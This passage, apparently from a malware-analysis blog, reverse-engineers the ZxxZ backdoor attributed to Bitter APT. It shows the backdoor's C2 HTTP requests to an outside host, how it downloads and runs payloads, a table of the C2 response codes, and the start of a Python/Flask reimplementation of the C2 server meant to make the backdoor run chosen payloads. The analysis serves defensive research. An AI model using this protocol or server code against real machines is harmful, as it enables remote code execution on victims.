+</span></span></code></pre></td></tr></table></div></div><p>Once the malware has sent its C2 checkin, it will then check the response for the first occurance of the <code>\&lt;ComputerName\>\&lt;Username\></code> that it sent using <em><a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strstr-wcsstr-mbsstr-mbsstr-l?view=msvc-170" target=_blank rel="noopener noreffer">strstr</a></em>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=n>pcResult</span> <span class=o>=</span> <span class=n>strstr</span><span class=p>(</span><span class=n>C2Response</span><span class=p>,</span><span class=o>&amp;</span><span class=n>ComputerNameUsername</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>pcResult</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=c1>// &lt;c2-ops-here&gt;
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>After this has completed, it will parse between the double quotes for a process name. If a process name is provided, it will check to see if that process is currently running. If it is running, it will respond to the C2 server with the following response.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php?txt=RNGZxxZexplorerZxxZMALWARE-PCmalware</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span><span class=l>subscribe.tomcruefrshsvc.com</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span></code></pre></td></tr></table></div></div><p>The format is <code>RNG\&lt;delimiter\>\&lt;process-name\>\&lt;delimiter\>\&lt;computername\>\&lt;username\></code>. Interestingly, <code>RNG</code> is hardcoded and stored as a scalar operand in little endian.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>dword</span> <span class=no>ptr</span> <span class=p>[</span><span class=no>CHAR_ARRAY_00407950</span><span class=p>],</span> <span class=mi>0x474e52</span>
+</span></span></code></pre></td></tr></table></div></div><p>If the process is not running, it will perform the following request.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/VcvNbtgRrPopqSD/WqeC812CCvU/&lt;payload&gt;</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span><span class=l>subscribe.tomcruefrshsvc.com</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span></code></pre></td></tr></table></div></div><p>It will then create the folder <code>%AppData%\\Local\\Debug</code>. If unsuccessful, it will instead create the directory <code>C:\\&lt;username\>\\Templates</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=n>hResult</span> <span class=o>=</span> <span class=n>SHGetFolderPathA</span><span class=p>((</span><span class=n>HWND</span><span class=p>)</span><span class=nb>NULL</span><span class=p>,</span> <span class=n>CSIDL_LOCAL_APPDATA</span><span class=p>,</span> <span class=p>(</span><span class=n>HANDLE</span><span class=p>)</span><span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>pszPath</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>hResult</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>strcat_s</span><span class=p>(</span><span class=n>pszPath</span><span class=p>,</span><span class=mi>250</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\\</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>strcat_s</span><span class=p>(</span><span class=n>pszPath</span><span class=p>,</span><span class=mi>250</span><span class=p>,</span><span class=s>&#34;Debug&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>_mkdir</span><span class=p>(</span><span class=n>pszPath</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>hResult</span> <span class=o>=</span> <span class=n>SHGetFolderPathA</span><span class=p>((</span><span class=n>HWND</span><span class=p>)</span><span class=nb>NULL</span><span class=p>,</span><span class=n>CSIDL_TEMPLATES</span><span class=p>,(</span><span class=n>HANDLE</span><span class=p>)</span><span class=nb>NULL</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=n>pszPath</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>hResult</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Once the directory is created, it will concatenate the payload name with the extension <code>.exe</code>. After this, it will write the first byte <code>M</code> manually, then write the rest of the payload sent from the C2 server to disk, ignoring the first 0xf65 bytes of data sent.</p><p>It will then make the following request to let the C2 server know the payload is being executed.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php?txt=DN-SZxxZpayload.vbsZxxZMALWARE-PCmalware</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span><span class=l>subscribe.tomcruefrshsvc.com</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span></code></pre></td></tr></table></div></div><p>Once this has been sent to the C2 server, it will finally execute the payload using <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea target=_blank rel="noopener noreffer">shell32.ShellExecuteA</a></em>.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/8a97eaae60c7df18708323a91a1e8137088eb958336f83c25d41989064d0787e.png data-srcset="/images/8a97eaae60c7df18708323a91a1e8137088eb958336f83c25d41989064d0787e.png, /images/8a97eaae60c7df18708323a91a1e8137088eb958336f83c25d41989064d0787e.png 1.5x, /images/8a97eaae60c7df18708323a91a1e8137088eb958336f83c25d41989064d0787e.png 2x" data-sizes=auto alt=/images/8a97eaae60c7df18708323a91a1e8137088eb958336f83c25d41989064d0787e.png title=execute-payload width=1181 height=568>
+<em>Figure 7: Executing Payload with <a href=https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea target=_blank rel="noopener noreffer">shell32.ShellExecuteA</a></em></p><p>After the payload has been executed, it will check to see if the processes was created successfully. This feature of course has timing issues for additional payloads sent by the C2 server that do not run in an infinite loop. 😅</p><p>If the payload process is running it will send the following request to the C2 server.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php?txt=SZxxZpayloadZxxZMALWARE-PCmalware</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span><span class=l>subscribe.tomcruefrshsvc.com</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span></code></pre></td></tr></table></div></div><p>If the payload process is not running, it will send the following request to the C2 server.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php?txt=RN_EZxxZpayloadZxxZMALWARE-PCmalware</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span><span class=l>subscribe.tomcruefrshsvc.com</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span></code></pre></td></tr></table></div></div><p>It will then sleep for <code>15</code> seconds and repeat the loop.</p><p>Interestingly, while they <code>obfuscated</code> (very poorly) the payload in the network traffic by prepending it with garbage data. They do not follow suit in storing their payloads in any obfuscated way on disk. Which means, they will have to be very careful not to be detected.</p><h5 id=c2-responses>C2 Responses</h5><p>At this point we can map out the following C2 responses and their meaning.</p><table><thead><tr><th>C2 Response</th><th>Description</th></tr></thead><tbody><tr><td>RNG</td><td>Payload is already running</td></tr><tr><td>DN-S</td><td>Payload is executing</td></tr><tr><td>S</td><td>Executed payload is running</td></tr><tr><td>RN_E</td><td>Executed payload is not running</td></tr></tbody></table><h5 id=c2-server-code>C2 Server Code</h5><p>Now that we know everything there is to know about how Bitter APT&rsquo;s ZxxZ backdoor communicates with its C2 server. We can implement our own C2 server to manipulate it to execute our own payloads.</p><p>For this we will use <a href=https://www.python.org/ target=_blank rel="noopener noreffer">Python</a> and <a href=https://flask.palletsprojects.com/en/2.1.x/ target=_blank rel="noopener noreffer">Flask</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>logging</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>request</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>__version__</span> <span class=o>=</span> <span class=s1>&#39;1.0.0&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>__author__</span>  <span class=o>=</span> <span class=s1>&#39;c3rb3ru5d3d53c&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=n>prog</span><span class=o>=</span><span class=sa>f</span><span class=s1>&#39;zxxz v</span><span class=si>{</span><span class=n>__version__</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>description</span><span class=o>=</span><span class=s1>&#39;Bitter APT ZxxZ Backdoor C2 Server&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>epilog</span><span class=o>=</span><span class=sa>f</span><span class=s1>&#39;Author: </span><span class=si>{</span><span class=n>__author__</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;--version&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>action</span><span class=o>=</span><span class=s1>&#39;version&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>version</span><span class=o>=</span><span class=sa>f</span><span class=s1>&#39;v</span><span class=si>{</span><span class=n>__version__</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;-i&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;--input&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>default</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>help</span><span class=o>=</span><span class=s1>&#39;Input Payload&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>required</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;--host&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>default</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>required</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>help</span><span class=o>=</span><span class=s1>&#39;Listen Host&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;-p&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;--port&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nb>type</span><span class=o>=</span><span class=nb>int</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>default</span><span class=o>=</span><span class=mi>80</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>required</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>help</span><span class=o>=</span><span class=s1>&#39;Listen Port&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;-d&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;--debug&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>action</span><span class=o>=</span><span class=s1>&#39;store_true&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>default</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>required</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>help</span><span class=o>=</span><span class=s1>&#39;Debug&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>logging</span><span class=o>.</span><span class=n>basicConfig</span><span class=p>(</span><span class=n>level</span><span class=o>=</span><span class=n>logging</span><span class=o>.</span><span class=n>DEBUG</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload_name</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>basename</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>input</span><span class=p>)</span>     <span class=c1># Payload filename (.exe appened on clientside)</span>
+</span></span><span class=line><span class=cl><span class=n>payload_name</span> <span class=o>=</span> <span class=n>payload_name</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;.exe&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>magic_0</span>      <span class=o>=</span> <span class=s1>&#39;RNG&#39;</span>                            <span class=c1># Payload is already running</span>
+</span></span><span class=line><span class=cl><span class=n>magic_1</span>      <span class=o>=</span> <span class=s1>&#39;DN-S&#39;</span>                           <span class=c1># Payload is executing</span>
+</span></span><span class=line><span class=cl><span class=n>magic_2</span>      <span class=o>=</span> <span class=s1>&#39;S&#39;</span>                              <span class=c1># Executed payload is running</span>
+</span></span><span class=line><span class=cl><span class=n>magic_3</span>      <span class=o>=</span> <span class=s1>&#39;RN_E&#39;</span>                           <span class=c1># Executed payload is not running</span>
+</span></span><span class=line><span class=cl><span class=n>delim</span>        <span class=o>=</span> <span class=s1>&#39;ZxxZ&#39;</span>                           <span class=c1># URI arameter delimiter</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload_data</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>input</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>payload_is_already_running</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>    Payload is already running
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>7</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=n>delim</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>process_name</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>computer</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>logger</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[</span><span class=si>{</span><span class=n>computer</span><span class=si>}</span><span class=s1>] </span><span class=si>{</span><span class=n>process_name</span><span class=si>}</span><span class=s1> is already running&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>process_name</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>payload_is_executing</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>    Payload is executing
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>8</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=n>delim</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>process_name</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>computer</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>logger</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[</span><span class=si>{</span><span class=n>computer</span><span class=si>}</span><span class=s1>] </span><span class=si>{</span><span class=n>process_name</span><span class=si>}</span><span class=s1> is executing&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>process_name</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>payload_is_running</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>    Executed payload is running
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>1</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=n>delim</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>process_name</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>computer</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>logger</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[</span><span class=si>{</span><span class=n>computer</span><span class=si>}</span><span class=s1>] </span><span class=si>{</span><span class=n>process_name</span><span class=si>}</span><span class=s1> is running&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>process_name</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>payload_is_not_running</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>    Executed payload is not running
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>8</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=n>delim</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>process_name</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>computer</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>logger</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[</span><span class=si>{</span><span class=n>computer</span><span class=si>}</span><span class=s1>] </span><span class=si>{</span><span class=n>process_name</span><span class=si>}</span><span class=s1> payload is not running&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>process_name</span>
+</span></span><span class=line><span class=cl>
